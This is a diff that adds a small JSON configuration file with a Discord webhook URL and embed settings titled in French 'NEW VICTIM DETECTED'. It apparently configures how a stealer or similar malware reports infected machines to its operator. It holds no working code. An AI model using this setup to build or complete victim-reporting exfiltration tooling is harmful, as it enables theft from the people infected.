@@ -1,0 +1,6 @@
+{
+  "webhook_url": "https://discord.com/api/webhooks/",
+  "embed_color": "#FF00FF",
+  "embed_title": "🚨 NOUVELLE VICTIME DETECTÉE 🚨",
+  "log_to_file": true
+}
